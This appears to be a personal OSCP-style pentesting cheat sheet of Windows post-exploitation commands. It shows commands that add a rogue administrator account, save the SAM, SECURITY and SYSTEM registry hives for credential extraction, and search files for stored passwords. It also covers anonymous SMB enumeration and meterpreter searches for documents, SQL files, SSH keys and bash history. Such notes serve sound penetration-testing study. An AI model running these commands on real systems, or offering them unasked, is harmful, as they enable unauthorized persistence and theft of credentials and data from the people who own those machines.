---
tags: 🔻 🔻/OS/windows
aliases: Hacking Notes
---

# Possibly useful windows stuff

net user hacker my\_password /add  
net localgroup Administrator hacker /add  
  
net user user user123 /add  
net localgroup administrators pentesting /add  
  
python windows-exploit-suggester.py --database test.xls --systeminfo optimum-system.txt

# Basic Windows commands

hostname && type proof.txt && ipconfig /all  
{specifically for OSCP proofs}
    
  
C:\\> reg.exe save hklm\\sam c:\\windows\\temp\\sam.save  
C:\\> reg.exe save hklm\\security c:\\windows\\temp\\security.save  
C:\\> reg.exe save hklm\\system c:\\windows\\temp\\system.save  
  
\# Basics  
systeminfo  
hostname  
  
\# Who am I?  
whoami  
echo %username%  
  
\# What users/localgroups are on the machine?  
net users  
net localgroups  
  
\# More info about a specific user. Check if user has privileges.  
net user user1  
  
\# View Domain Groups  
net group /domain  
  
\# View Members of Domain Group  
net group /domain *Group Name*  
  
\# Firewall  
netsh firewall show state  
netsh firewall show config  
  
\# Network  
ipconfig /all  
route print  
arp -A  
  
\# How well patched is the system?  
wmic qfe get Caption,Description,HotFixID,InstalledOn  
  


### Search for them

  
  
findstr /si password \*.txt  
findstr /si password \*.xml  
findstr /si password \*.ini  
  
Find all those strings in config files.  
dir /s \*pass\* == \*cred\* == \*vnc\* == \*.config\*  
  
\# Find all passwords in all files.  
findstr /spin "password" \*.\*  
findstr /spin "password" \*.\*  
  
icacls root.txt /grant alfred:F

# samba version

Samba version -  
  
ngrep -i -d tap0 's.?a.?m.?b.?a.\*\[\[:digit:\]\]'  
smbclient -L ip -U "" -N  
ngrep -i -d tap0 's.?a.?m.?b.?a.\*\[\[:digit:\]\]' && smbclient -L ip -U "" -N  
  
  
[https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon\_enum/smbver.sh](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

# meterpreter search

#metasploit 
meterpreter  
search -f \*.txt  
search -f \*.zip  
search -f \*.doc  
search -f \*.xls  
search -f config\*  
search -f \*.rar  
search -f \*.docx  
search -f \*.sql  
  
.ssh:  
.bash\_history